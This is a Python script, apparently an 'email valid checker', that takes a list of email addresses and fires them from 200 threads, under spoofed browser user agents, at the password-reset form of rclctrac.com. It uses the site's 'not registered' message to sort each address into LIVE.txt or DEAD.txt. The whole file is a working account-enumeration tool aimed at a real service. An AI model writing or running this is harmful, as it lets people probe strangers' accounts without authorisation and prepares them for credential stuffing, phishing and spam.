from tqdm import tqdm
from colorama import init, Fore
init(convert=True)
import json
from threading import Lock as LockPool
import time
from datetime import datetime, date
import requests, re, sys, os, ctypes
from multiprocessing.dummy import Pool as ThreadPool
from fake_useragent import UserAgent
my_fake_s = UserAgent()
urlew = 'http://ipinfo.io/json'
responsew = requests.get(urlew).text
data = json.loads(responsew)
ctypes.windll.kernel32.SetConsoleTitleW('Myrclhome Valid Fast Check')
valid = 0
invalid = 0
count = 0
myThreads = 200
myLock = LockPool()
myPool = ThreadPool(myThreads)
version = 'Anone'
textlive = 'This email address exists already in our database.'.encode()

setting = {
    'User-Agent' : my_fake_s
}
colors = {
    'merah': Fore.RED,
    'hijau': Fore.GREEN,
    'putih': Fore.WHITE,
    'kuning': Fore.YELLOW,
    'biru': Fore.CYAN,
    'black': Fore.BLACK,
    'purple': '\033[0;35m'
}
    
try:
    filelist = sys.argv[1]
    loglive = open('LIVE.txt', 'a')
    logdie = open('DEAD.txt', 'a')
except Exception as Err:
    try:
        print('Use '+sys.argv[0]+' list.txt')
        sys.exit()
    finally:
        Err = None
        del Err

list = (open(filelist, 'r', encoding='utf8')).readlines()

def file_size(file_path):
    """
    fungsi ini akan mengembalikan ukuran file
    """
    if os.path.isfile(file_path):
        file_info = os.stat(file_path)
        return convert_bytes(file_info.st_size)


file_path = filelist

def convert_bytes(num):
    """
    fungsi ini akan mengkonversi byte menjadi MB.... GB... etc
    """
    for x in ('Bytes', 'KB', 'MB', 'GB', 'TB'):
        if num < 1024.0:
            return '%3.1f %s' % (num, x)
        num /= 1024.0
def checking(email):
    global count
    global invalid
    global valid
    email = email.strip()
    url = 'https://rclctrac.com/pages/forgot_password'
    headers = {'User-Agent': my_fake_s.chrome,
			   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			   'Accept-Language': 'en-US,en;q=0.5',
			   'Accept-Encoding': 'gzip, deflate, br',
			   'Referer': 'https://rclctrac.com/pages/forgot_password',
			   'Origin': 'https://rclctrac.com',
			   'Content-Type': 'application/x-www-form-urlencoded',
			   'Upgrade-Insecure-Requests':'1'}
    data = {'data[User][email]':email}
    response = requests.post('https://rclctrac.com/pages/forgot_password', data=data, headers=headers)
    #count += 1
    if 'Sorry! The email address you have entered is not registered in our database. To create an account, please click on Register.' in (response.text):
        with myLock:
            count = count+1
            invalid = invalid+1
            print (colors['putih']+ "(List: ",count , "/", len(list), ") (",colors['hijau']+ str(valid), "/",colors['merah']+ str(invalid),")",colors['merah']+ "DIE => " + email)
            logdie.write(email+'\n')
    else:
        with myLock:
            Pac = email+"\n"
            loglive.write(Pac)
            count = count+1
            valid = valid+1
            print (colors['putih']+ "(List: ",count , "/", len(list), ") (",colors['hijau']+ str(valid), "/",colors['merah']+ str(invalid),")",colors['hijau']+ "LIVE => " + email)

def finish():
    endTime = time.time()
    print('--------------------------------------------------------------------------------')
    print('Time Spent    :', round(endTime - startTime, 2), 'Seconds')
    print('[LIVE - ' + str(valid) + ' - DEAD - ' + str(invalid) + ']')

startTime = time.time()
if __name__ == '__main__':
    time.sleep(3)
    bersih = lambda : os.system('cls' if os.name == 'nt' else 'clear')
    myPool.map(checking, list)
    myPool.close()
    myPool.join()
    finish()